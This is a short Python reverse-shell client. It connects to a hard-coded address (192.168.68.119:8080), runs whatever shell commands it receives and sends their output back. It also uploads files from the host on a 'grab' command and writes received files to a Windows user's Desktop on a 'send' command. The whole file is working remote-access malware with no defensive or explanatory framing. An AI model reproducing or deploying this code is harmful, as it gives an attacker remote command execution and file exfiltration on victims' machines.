import socket
import subprocess
import os


def transfer(s, path):
    if os.path.exists(path):
        print('here')
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

def download(conn, command):
    f = open('C:\\Users\\IEUser\\Desktop\\' + command, 'wb')
    while True:
        bits = conn.recv(1024) 
        if bits.endswith('DONE'.encode()):
            print('here')
            f.write(bits[:-4])
            f.close()
            print('[+] Transfer completed ')
            break
        if 'File not found'.encode() in bits:
            print('[-] Unable to find out the file')
            break
        f.write(bits)
        print('here')

def connecting():
    s = socket.socket()
    s.connect(("192.168.68.119", 8080))

    while True:
        command = s.recv(1024)

        if 'terminate' in command.decode():
            s.close()
            break

        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            print("here1")
            try:
                transfer(s, path)
            except:
                pass

        elif 'send' in command.decode():
            send, path = command.decode().split("*")
            download(s, path)


        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            s.send(CMD.stderr.read())
            s.send(CMD.stdout.read())


def main():
    connecting()


main()
